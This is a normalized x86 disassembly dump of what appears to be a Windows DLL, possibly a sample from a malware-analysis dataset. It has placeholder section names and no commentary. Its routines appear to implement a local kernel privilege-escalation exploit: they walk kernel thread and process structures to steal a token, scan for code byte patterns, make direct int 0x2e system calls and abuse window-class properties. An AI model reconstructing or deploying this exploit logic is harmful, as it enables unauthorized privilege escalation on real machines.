mov [ eax + 0x3 ] cl
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx esi
sub eax esi
mov dl [ eax + ecx ]
mov [ ecx ] dl
inc ecx
dec edi
jne r-xdata
sub_10009898
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
test edi edi
jbe r-xdata
mov eax [ ebp + 0x18 ]
mov cl [ ebp + 0x14 ]
pop edi
mov [ esi + eax ] cl
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx esi
sub eax esi
mov dl [ eax + ecx ]
mov [ ecx ] dl
inc ecx
dec edi
jne r-xdata
sub_100098c4
push esi
push edi
push rw-data
push 0x0
push 0x100000
call [ OpenMutexW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push 0x3a98
push edi
call [ WaitForSingleObject@IAT ]
mov esi eax
cmp esi 0x80
je r-xdata
call [ GetLastError@IAT ]
push eax
call [ SetLastError@IAT ]
xor eax eax
jmp r-xdata
mov eax edi
test esi esi
je r-xdata
pop edi
pop esi
retn
push ebx
call [ GetLastError@IAT ]
push edi
mov ebx eax
call [ CloseHandle@IAT ]
cmp esi 0x102
jne r-xdata
push ebx
push 0x79
jmp r-xdata
call [ SetLastError@IAT ]
xor eax eax
pop ebx
jmp r-xdata
sub_10009936
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
mov esi [ ebp + 0x8 ]
push r--data
push esi
call sub_10009b69
pop ecx
test eax eax
pop ecx
je r-xdata
test esi esi
jne r-xdata
call eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
cmp eax 0x5
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x6
jne r-xdata
cmp [ esi + 0xc ] 0x2
jne r-xdata
pop esi
leave
retn
mov eax [ fs : 0x124 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x124 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x1
jb r-xdata
mov eax [ fs : 0x124 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_100099aa
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
je r-xdata
xor eax eax
mov ecx [ eax + 0x8 ]
sub ecx 0x4
je r-xdata
push eax
call sub_10009936
mov edx [ ebp + 0xc ]
pop ecx
mov ecx eax
cmp [ ecx + 0x94 ] edx
je r-xdata
dec ecx
je r-xdata
pop esi
pop ebp
retn
mov eax [ eax + 0x98 ]
sub eax 0x98
je r-xdata
mov ecx [ eax + 0xc ]
cmp ecx esi
jne r-xdata
dec ecx
jne r-xdata
cmp eax ecx
je r-xdata
cmp ecx 0x1
jne r-xdata
push eax
call sub_10009936
mov edx [ ebp + 0xc ]
pop ecx
mov ecx eax
cmp [ ecx + 0x9c ] edx
je r-xdata
push eax
call sub_10009936
pop ecx
xor edx edx
mov ecx eax
cmp ecx esi
je r-xdata
inc esi
cmp esi 0x3e8
jg r-xdata
cmp ecx 0x2
jne r-xdata
push eax
call sub_10009936
mov edx [ ebp + 0xc ]
pop ecx
mov ecx eax
cmp [ ecx + 0x84 ] edx
je r-xdata
mov eax [ eax + 0xa0 ]
sub eax 0xa0
je r-xdata
mov esi [ eax + 0x9c ]
cmp esi [ ebp + 0xc ]
je r-xdata
cmp [ eax + 0x94 ] edx
jne r-xdata
cmp [ eax + 0x10 ] si
push eax
jne r-xdata
mov eax [ eax + 0x88 ]
sub eax 0x88
je r-xdata
cmp eax ecx
je r-xdata
mov eax [ eax + 0xa0 ]
sub eax 0xa0
je r-xdata
jmp r-xdata
call sub_10009936
pop ecx
mov ecx eax
cmp ecx esi
je r-xdata
call sub_10009936
mov edx [ ebp + 0xc ]
pop ecx
mov ecx eax
cmp [ ecx + 0x84 ] edx
je r-xdata
cmp eax ecx
je r-xdata
inc esi
cmp esi 0x3e8
jg r-xdata
cmp eax ecx
je r-xdata
mov edx [ eax + 0x94 ]
cmp edx [ ebp + 0xc ]
je r-xdata
mov eax [ eax + 0x88 ]
sub eax 0x88
je r-xdata
inc esi
cmp esi 0x3e8
jg r-xdata
cmp [ eax + 0x9c ] edx
jne r-xdata
inc edx
cmp edx 0x3e8
jle r-xdata
mov eax [ eax + 0x98 ]
sub eax 0x98
je r-xdata
cmp eax ecx
je r-xdata
cmp [ eax + 0x84 ] edx
jne r-xdata
jmp r-xdata
cmp eax ecx
je r-xdata
inc esi
cmp esi 0x3e8
jg r-xdata
jmp r-xdata
inc esi
cmp esi 0x3e8
jle r-xdata
cmp [ eax + 0x84 ] edx
jne r-xdata
jmp r-xdata
jmp r-xdata
sub_10009b69
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
cmp [ esi + 0x18 ] 0x0
push edi
je r-xdata
push [ esi ]
call [ GetProcAddress@IAT ]
mov ecx eax
call strlen
mov [ ebp - 0x8 ] ax
mov eax [ ebp - 0x8 ]
inc eax
pop ecx
mov [ ebp - 0x6 ] ax
lea eax [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push eax
lea eax [ ebp - 0x8 ]
push 0x0
push eax
mov [ ebp - 0x4 ] edi
push [ esi ]
call [ esi + 0x18 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
sub eax [ esi ]
add eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
jmp r-xdata
pop edi
pop esi
leave
retn
test ecx ecx
je r-xdata
sub_10009bd3
push ebp
mov ebp esp
sub esp 0x9c
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
push edi
je r-xdata
xor al al
jmp r-xdata
push 0x24
push ebx
push esi
call sub_1000d316
mov eax rw-data
push eax
mov edi eax
call sub_1000c932
add esp 0x10
cmp eax ebx
mov [ esi + 0x4 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
push ebx
push edi
call [ LoadLibraryExA@IAT ]
cmp eax ebx
mov [ esi ] eax
jne r-xdata
mov eax rw-data
push eax
mov edi eax
call sub_1000c932
cmp eax ebx
pop ecx
mov [ esi + 0x4 ] eax
je r-xdata
lea eax [ ebp - 0x9c ]
mov [ ebp - 0x9c ] 0x9c
push eax
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x98 ]
mov eax [ ebp - 0x94 ]
mov dx [ ebp - 0x8 ]
mov di [ ebp - 0x6 ]
cmp ecx 0x5
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] dx
mov [ esi + 0x12 ] di
jne r-xdata
call [ GetVersion@IAT ]
movzx ecx al
mov [ esi + 0x8 ] ecx
xor ecx ecx
mov cl ah
movzx eax cl
mov [ esi + 0xc ] eax
jmp r-xdata
cmp ecx 0x6
jb r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax 0x4
je r-xdata
push esi
call sub_10009d28
pop ecx
cmp eax 0x2
je r-xdata
cmp dx 0x2
jae r-xdata
mov [ esi + 0x1c ] ebx
dec eax
je r-xdata
mov al 0x1
push rw-data
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ esi + 0x18 ] eax
mov eax [ esi + 0xc ]
cmp eax ebx
je r-xdata
dec eax
jne r-xdata
push rw-data
push esi
call sub_10009b69
pop ecx
mov [ esi + 0x1c ] eax
pop ecx
jmp r-xdata
jbe r-xdata
cmp [ esi + 0x8 ] 0x5
jb r-xdata
jmp r-xdata
mov [ esi + 0x20 ] ebx
cmp eax 0x2
ja r-xdata
push rw-data
push esi
call sub_10009b69
push rw-data
push esi
mov [ esi + 0x1c ] eax
call sub_10009b69
add esp 0x10
mov [ esi + 0x20 ] eax
jmp r-xdata
sub_10009d28
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x70
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor eax eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x50 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0x5a4d
jne r-xdata
xor al al
mov edi [ eax + 0x3c ]
add edi eax
push 0xf8
push edi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
cmp [ edi ] 0x4550
jne r-xdata
mov eax [ edi + 0x2c ]
mov ebx [ edi + 0x34 ]
add ebx eax
mov [ ebp - 0x68 ] ebx
add eax [ esi ]
mov [ ebp - 0x60 ] eax
mov eax [ edi + 0x1c ]
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x24 ] rw-data
mov eax [ esi + 0x8 ]
cmp eax 0x5
jne r-xdata
cmp eax 0x6
jb r-xdata
cmp [ esi + 0xc ] 0x2
jne r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x3c ] eax
test eax eax
je r-xdata
mov [ ebp - 0x24 ] rw-data
cmp [ esi + 0x10 ] 0x1
jae r-xdata
push rw-data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
push 0x1
push 0x1
push [ esi ]
call eax
mov edi eax
push [ ebp - 0x3c ]
call [ FreeLibrary@IAT ]
test edi edi
je r-xdata
push rw-data
push [ esi ]
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
cmp [ esi + 0x8 ] 0x6
push eax
push [ ebp - 0x34 ]
push [ ebp - 0x58 ]
push [ ebp - 0x54 ]
push [ ebp - 0x60 ]
push esi
jae r-xdata
cmp [ edi + 0x10 ] 0x0
je r-xdata
call sub_1000a05b
jmp r-xdata
call sub_10009f62
add eax [ esi ]
push eax
push rw-data
call sub_1000d4dc
pop ecx
pop ecx
test eax eax
jne r-xdata
add esp 0x18
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
add edi 0x14
jmp r-xdata
mov edi [ edi + 0x10 ]
test edi edi
je r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
add edi [ esi ]
mov [ ebp - 0x6c ] edi
mov [ ebp - 0x70 ] edi
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx eax
shr ecx 0x1f
mov [ ebp - 0x7c ] cl
test cl cl
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
add eax [ esi ]
mov [ ebp - 0x78 ] eax
add eax 0x2
mov [ ebp - 0x74 ] eax
push rw-data
push eax
call sub_1000d4dc
pop ecx
pop ecx
test eax eax
jne r-xdata
add [ ebp - 0x70 ] 0x4
add edi 0x4
mov [ ebp - 0x6c ] edi
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push [ ebp - 0x24 ]
push [ ebp - 0x74 ]
call sub_1000d4dc
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x2c ] eax
sub eax [ ebp - 0x60 ]
mov [ ebp - 0x20 ] eax
add eax ebx
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x70 ]
mov eax [ eax ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x50 ] eax
sub eax [ ebp - 0x60 ]
mov [ ebp - 0x64 ] eax
add eax ebx
mov [ ebp - 0x34 ] eax
sub_10009f62
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
and [ ebp + 0x1c ] 0x0
push ebx
push esi
push edi
lea edi [ eax - 0x1000 ]
inc edi
inc [ ebp + 0x1c ]
cmp [ ebp + 0x1c ] 0x2000
jl r-xdata
cmp [ edi + 0x1 ] 0x8b
jne r-xdata
cmp [ edi ] 0x55
jne r-xdata
xor al al
cmp [ edi + 0x2 ] 0xec
jne r-xdata
mov ecx edi
xor esi esi
inc ecx
movzx eax [ ecx + 0x4 ]
movzx edx [ ecx + 0x3 ]
shl eax 0x8
add eax edx
mov ebx ecx
movzx edx [ ecx + 0x2 ]
shl eax 0x8
add eax edx
movzx edx [ ecx + 0x1 ]
shl eax 0x8
add ebx eax
lea eax [ edx + ebx + 0x5 ]
mov edx [ ebp + 0xc ]
cmp eax edx
jb r-xdata
cmp [ ecx ] 0xe8
jne r-xdata
inc esi
cmp esi 0x32
jl r-xdata
mov ebx [ ebp + 0x10 ]
add edx ebx
cmp eax edx
ja r-xdata
xor esi esi
inc eax
inc esi
cmp esi 0x32
jl r-xdata
cmp [ eax + 0x1 ] 0x15
jne r-xdata
cmp [ eax ] 0xff
jne r-xdata
jmp r-xdata
mov edx [ eax + 0x2 ]
cmp edx [ ebp + 0x14 ]
je r-xdata
add eax 0x6
xor edx edx
inc eax
inc edx
cmp edx 0x14
jl r-xdata
cmp [ eax + 0x1 ] 0x15
jne r-xdata
cmp [ eax ] 0xff
jne r-xdata
mov ebx [ eax + 0x2 ]
cmp ebx [ ebp + 0x18 ]
jne r-xdata
add ecx 0x5
cmp [ ecx ] 0x85
jne r-xdata
cmp [ ecx + 0x1 ] 0xc0
jne r-xdata
cmp [ ecx + 0x2 ] 0x74
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
sub edx [ eax ]
lea ecx [ edx + ecx + 0x2 ]
mov [ eax + 0x14 ] ecx
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000a05b
mov eax [ esp + 0x18 ]
push esi
push edi
xor edi edi
lea edx [ eax - 0x1000 ]
inc edx
inc edi
cmp edi 0x2000
jl r-xdata
cmp [ edx + 0x1 ] 0x8b
jne r-xdata
cmp [ edx ] 0x55
jne r-xdata
xor al al
cmp [ edx + 0x2 ] 0xec
jne r-xdata
lea eax [ edx + 0x3 ]
xor edi edi
inc eax
inc edi
cmp edi 0x32
jl r-xdata
cmp [ eax + 0x1 ] 0x15
jne r-xdata
cmp [ eax ] 0xff
jne r-xdata
jmp r-xdata
mov ecx [ eax + 0x2 ]
cmp ecx [ esp + 0x18 ]
je r-xdata
add eax 0x6
xor esi esi
inc eax
inc esi
cmp esi 0x14
jl r-xdata
cmp [ eax + 0x1 ] 0x15
jne r-xdata
cmp [ eax ] 0xff
jne r-xdata
mov ecx [ eax + 0x2 ]
cmp ecx [ esp + 0x1c ]
jne r-xdata
add eax 0x6
xor ecx ecx
inc eax
inc ecx
cmp ecx 0x28
jl r-xdata
cmp [ eax + 0x1 ] 0xc0
jne r-xdata
cmp [ eax ] 0x85
jne r-xdata
cmp [ eax + 0x2 ] 0x74
je r-xdata
mov ecx [ esp + 0xc ]
mov edx [ ecx + 0x4 ]
sub edx [ ecx ]
lea eax [ edx + eax + 0x2 ]
mov [ ecx + 0x14 ] eax
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn
sub_1000a0fc
push ebp
mov ebp esp
sub esp 0x250
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
push 0x57
cmp [ ebp + 0xc ] edi
je r-xdata
mov ebx [ ebp + 0x10 ]
cmp ebx edi
je r-xdata
mov esi 0x104
lea eax [ ebp - 0x250 ]
push esi
push eax
push rw-data
call [ GetEnvironmentVariableW@IAT ]
lea eax [ ebp - 0x250 ]
push eax
call [ wcslen@IAT ]
sub esi eax
lea eax [ ebp - 0x250 ]
push esi
push rw-data
push eax
call [ wcsncat@IAT ]
add esp 0x10
lea eax [ ebp - 0x250 ]
push edi
push 0x8000000
push 0x3
push edi
push 0x1
push 0x80000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push esi
call sub_1000be67
add esp 0x18
mov ebx eax
push esi
call [ CloseHandle@IAT ]
cmp ebx edi
je r-xdata
push 0xffffffd7
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_10009bd3
mov [ esp ] rw-data
push [ ebp + 0x8 ]
call [ lstrcpyA@IAT ]
push [ ebp + 0x8 ]
push rw-data
push [ ebp + 0xc ]
call [ SetPropA@IAT ]
lea eax [ ebp + 0x10 ]
push 0x7
mov [ ebp + 0x14 ] eax
lea eax [ ebp - 0x44 ]
push eax
push 0x1
push sub_1000a25a
mov [ ebp + 0x10 ] edi
push [ ebp + 0x8 ]
push 0x11
push rw-data
call sub_10009835
add esp 0x1c
mov eax [ ebp - 0x44 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp - 0x3c ]
push 0x0
push [ ebp + 0xc ]
mov edx esp
int 0x2e
add esp 0x14
or [ ebp + 0x8 ] 0xffffffff
mov eax [ ebp - 0x40 ]
push 0x0
push 0x0
mov edx esp
int 0x2e
add esp 0x8
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
push 0xffffffd4
jmp r-xdata
pop eax
pop edi
pop esi
pop ebx
leave
retn
sub_1000a25a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0xc ]
mov [ ecx ] edx
mov ecx [ eax + 0x8 ]
add ecx 0x4
mov edx [ eax + 0x10 ]
mov [ ecx ] edx
and [ ebp - 0x4 ] 0x0
push [ eax + 0x1c ]
push [ eax + 0x18 ]
lea ecx [ eax + 0x20 ]
push ecx
call [ eax + 0x14 ]
add esp 0xc
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a2cd
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x388
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
je r-xdata
push 0x57
cmp [ ebp + 0xc ] ebx
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ edi + 0x200 ]
mov [ ebp - 0x398 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x20 ] bl
mov [ ebp - 0x1f ] bl
push rw-data
call sub_1000c755
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call sub_1000beb7
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push 0xffffffba
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
call sub_10009bd3
pop ecx
test al al
jne r-xdata
push 0xffffffd4
jmp r-xdata
pop eax
or [ ebp - 0x7c ] 0xffffffff
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x13c ] ebx
lea eax [ ebp - 0x13c ]
push eax
lea eax [ ebp - 0x6c ]
push eax
call sub_1000aa69
pop ecx
pop ecx
test al al
jne r-xdata
push 0xffffffc3
jmp r-xdata
push 0xd
lea eax [ ebp - 0x6c ]
push eax
push 0x7
push sub_1000a7de
push edi
push 0x17
push rw-data
call sub_10009835
mov [ ebp - 0x178 ] edi
mov eax edi
shr eax 0x10
mov [ ebp - 0x384 ] eax
mov [ ebp - 0x8c ] 0xa0
mov [ ebp - 0x16c ] 0x30
mov [ ebp - 0x168 ] ebx
mov [ ebp - 0x164 ] ebx
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x15c ] ebx
mov [ ebp - 0x158 ] ebx
mov [ ebp - 0x154 ] ebx
mov [ ebp - 0x150 ] ebx
mov [ ebp - 0x14c ] ebx
mov [ ebp - 0x148 ] ebx
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x140 ] ebx
lea eax [ ebp - 0x16c ]
mov [ ebp - 0x94 ] eax
lea eax [ edi - 0xa0 ]
and eax 0xffff
mov [ ebp - 0x15c ] eax
push rw-data
lea eax [ ebp - 0x380 ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x380 ]
push eax
call [ wcslen@IAT ]
add esp 0x28
shl eax 0x1
mov [ ebp - 0x180 ] ax
mov [ ebp - 0x17e ] 0x200
lea eax [ ebp - 0x380 ]
mov [ ebp - 0x17c ] eax
lea eax [ ebp - 0x180 ]
mov [ ebp - 0x174 ] eax
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x390 ] ebx
push 0x8
push ebx
mov esi [ LocalAlloc@IAT ]
call esi
mov [ ebp - 0x90 ] eax
push 0x10
push ebx
call esi
mov esi eax
mov [ ebp - 0x390 ] esi
push 0x8
push ebx
push [ ebp - 0x90 ]
call sub_1000d316
push 0x10
push ebx
push esi
call sub_1000d316
push 0x8
push ebx
lea eax [ ebp - 0x38c ]
push eax
call sub_1000d316
mov eax [ ebp - 0x90 ]
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x84 ] esi
lea eax [ ebp - 0x38c ]
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x138 ] eax
mov esi 0x9c
push esi
push ebx
lea eax [ ebp - 0x134 ]
push eax
call sub_1000d316
add esp 0x30
mov [ ebp - 0x134 ] esi
lea eax [ ebp - 0x134 ]
push eax
call [ GetVersionExA@IAT ]
mov [ ebp - 0x394 ] rw-data
push 0xa
pop eax
mov [ ebp - 0x98 ] eax
cmp [ ebp - 0xa0 ] 0x1
jb r-xdata
mov [ ebp - 0x7c ] 0xffffffc1
jmp r-xdata
lea ecx [ edi + 0x500 ]
mov [ ebp - 0x170 ] ecx
push 0x8
push 0x1c
push ecx
push eax
push [ ebp - 0x394 ]
call sub_10009898
add esp 0x14
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x80
push 0x25a
push [ ebp - 0x138 ]
push [ ebp - 0x174 ]
push [ ebp - 0x174 ]
push [ ebp - 0x94 ]
mov eax [ ebp - 0x78 ]
call [ ebp - 0x170 ]
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
xor ebx ebx
push ebx
push rw-data
call [ UnregisterClassA@IAT ]
mov eax [ ebp - 0x384 ]
add eax 0xffffff60
and eax 0xffff
mov [ ebp - 0x15c ] eax
push 0x8
push ebx
mov esi [ LocalAlloc@IAT ]
call esi
mov edi eax
mov [ ebp - 0x90 ] edi
push 0x10
push ebx
call esi
mov esi eax
mov [ ebp - 0x390 ] esi
push 0x8
push ebx
push edi
call sub_1000d316
push 0x10
push ebx
push esi
call sub_1000d316
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x84 ] esi
push rw-data
lea eax [ ebp - 0x380 ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x380 ]
push eax
call [ wcslen@IAT ]
shl eax 0x1
mov [ ebp - 0x180 ] ax
mov [ ebp - 0x17e ] 0x200
push 0x8
push 0x1c
push [ ebp - 0x170 ]
push 0xa
push [ ebp - 0x394 ]
call sub_10009898
add esp 0x38
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x80
push 0x25b
push [ ebp - 0x138 ]
push [ ebp - 0x174 ]
push [ ebp - 0x174 ]
push [ ebp - 0x94 ]
mov eax [ ebp - 0x78 ]
call [ ebp - 0x170 ]
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0x0
push rw-data
call [ UnregisterClassA@IAT ]
push 0x8
push 0x1c
push [ ebp - 0x170 ]
push 0xa
push [ ebp - 0x394 ]
call sub_10009898
push [ ebp - 0x13c ]
call sub_1000c640
add esp 0x18
test al al
jne r-xdata
mov [ ebp - 0x394 ] rw-data
mov [ ebp - 0x98 ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_1000a7ba
mov eax [ ebp - 0x7c ]
jmp r-xdata
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x1
push 0x0
push 0x0
push 0x0
push 0x600
push [ ebp + 0xc ]
mov eax [ ebp - 0x74 ]
call [ ebp - 0x170 ]
mov [ ebp - 0x7c ] eax
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0x0
call sub_1000c640
pop ecx
cmp [ ebp - 0x7c ] 0x0
jne r-xdata
mov [ ebp - 0x7c ] 0xffffffc3
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
xor ebx ebx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x7c ] 0xffffffc0
push 0x7
lea eax [ ebp - 0x6c ]
push eax
push 0x1
push sub_1000a8d2
push [ ebp - 0x398 ]
push 0x11
push rw-data
call sub_10009835
push 0x8
push 0x4
push [ ebp - 0x170 ]
push 0xa
push [ ebp - 0x394 ]
call sub_10009898
push [ ebp - 0x13c ]
call sub_1000c640
add esp 0x34
test al al
je r-xdata
or [ ebp - 0x7c ] 0xffffffff
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x64
mov eax [ ebp - 0x1c ]
call [ ebp - 0x170 ]
mov [ ebp - 0x7c ] eax
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0x0
call sub_1000c640
pop ecx
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub_1000a7de
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
mov edi [ eax ]
mov [ ebp - 0x28 ] edi
mov eax [ esi + 0x50 ]
lea eax [ edi + eax * 4 ]
mov [ esi + 0x8 ] eax
mov ecx [ eax ]
mov [ esi + 0xc ] ecx
lea ecx [ esi + 0x40 ]
lea edx [ esi + 0x1c ]
push ebx
push 0x4
push ecx
push eax
push edx
call sub_1000c492
add esp 0x14
mov [ ebp - 0x2c ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x20 ] ecx
mov eax [ esi + 0x4 ]
mov [ ebp - 0x24 ] eax
cmp ecx ebx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ esi + 0x4c ] 0x1
xor eax eax
xor eax ecx
test eax 0xfffff000
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ecx ]
mov [ ebp - 0x30 ] eax
cmp eax edi
je r-xdata
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov ecx [ esi + 0x50 ]
lea eax [ eax + ecx * 4 ]
mov [ esi + 0x14 ] eax
mov ecx [ eax ]
mov [ esi + 0x18 ] ecx
push ebx
push 0x4
lea ecx [ esi + 0x40 ]
push ecx
push eax
lea eax [ esi + 0x1c ]
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x34 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
sub_1000a895
mov esp [ ebp - 0x18 ]
xor ebx ebx
mov esi [ ebp + 0x8 ]
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4c ] 0x1
xor eax eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a8d2
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
cmp esi 0xa
jae r-xdata
and [ ebp - 0x4 ] 0x0
push esi
call sub_1000a949
push esi
call sub_1000a9e7
push [ esi + 0x48 ]
push [ esi + 0x44 ]
lea eax [ esi + 0x1c ]
push eax
call [ esi ]
add esp 0x14
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax 0xc0000061
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a949
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
